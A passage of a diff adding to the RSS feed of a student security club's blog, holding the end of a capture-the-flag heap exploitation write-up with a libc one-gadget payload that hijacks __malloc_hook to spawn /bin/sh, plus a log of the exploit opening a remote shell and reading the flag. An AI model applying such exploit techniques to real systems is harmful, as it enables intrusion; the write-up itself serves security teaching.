+        &lt;span style=&#34;color:#75715e&#34;&gt;# !!!!! &lt;/span&gt;
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10a38c&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# &amp;lt;- one-gadget&lt;/span&gt;
+        &lt;span style=&#34;color:#75715e&#34;&gt;#pwn.p64(libc + 0x4f322) &lt;/span&gt;
+        &lt;span style=&#34;color:#75715e&#34;&gt;# pwn.p64(0x1337) &lt;/span&gt;
+        )
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x10a38c execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x70, environ)
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;constraints:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  [rsp+0x70] == NULL
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;4\n\x00\x00\x00&lt;/code&gt; corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger &lt;code&gt;__malloc_hook&lt;/code&gt; :).&lt;/p&gt;
+&lt;p&gt;Which gives:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
+[*] &#39;/mnt/once_and_for_all&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b&#39;/mnt/out&#39;
+[+] Opening connection to 167.172.56.180 on port 30332: Done
+[*] Switching to interactive mode
+
+How much space do you need for this massive weapon: Adding to your inventory..
+$ id
+uid=100(ctf) gid=101(ctf)
+$ ls
+flag.txt
+glibc
+once_and_for_all
+$ cat flag.txt
+HTB{m4y_th3_f0rc3_b3_w1th_B0Nn13!}
+&lt;/code&gt;&lt;/pre&gt;- http://clubsecuesiea.github.io/posts/onceandforall/ - Beerware shit</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>About us</title>
+        <link>http://clubsecuesiea.github.io/posts/about/</link>
+        <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
+        
+        <guid>http://clubsecuesiea.github.io/posts/about/</guid>
+        <description>ESIEA security club http://clubsecuesiea.github.io/posts/about/ -&lt;p&gt;We&amp;rsquo;re a bunch of security enthusiasts students belonging to the &lt;a href=&#34;https://www.esiea.fr/&#34;&gt;ESIEA&lt;/a&gt; engineering school. We aim to work on various security related subjects. On this website you will mainly find some write-ups about challenges .&lt;/p&gt;
+- http://clubsecuesiea.github.io/posts/about/ - Beerware shit</description>
+        </item>
+    
+    
+  </channel>
+</rss> 
